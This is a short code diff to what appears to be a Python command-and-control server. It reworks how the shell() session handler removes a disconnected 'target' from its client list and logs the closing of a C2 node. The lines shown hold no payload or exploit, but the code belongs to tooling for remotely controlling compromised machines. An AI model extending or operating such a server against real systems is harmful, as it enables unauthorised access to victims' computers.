@@ -280,6 +280,9 @@ def shell(sock: socket.socket, addr: tuple[str, int]) -> None:
                 if command in ["quit", "exit", "kill"]:  # Quit current client CLI
                     maintain_session = False
                     logging.info(f"{addr} - Closing session on target.")
+                    logging.info(f"{addr} - Removing target from database.")
+                    CLIENTS.remove((sock, addr))
+                    print(clr("[!] Disconnected from ") + str(addr))
                     if command == "kill":
                         logging.critical(f"{addr} - Terminating c2 node.")
                     break
@@ -305,10 +308,6 @@ def shell(sock: socket.socket, addr: tuple[str, int]) -> None:
         # Do nothing if user exists with 'background' / 'bg'
         if not maintain_session:
             sock.close()
-            logging.info(f"{addr} - Removing target from database.")
-            CLIENTS.remove((sock, addr))
-            print(clr("[!] Disconnected from ") + str(addr))
-
 
 def display_sessions() -> None:
     """
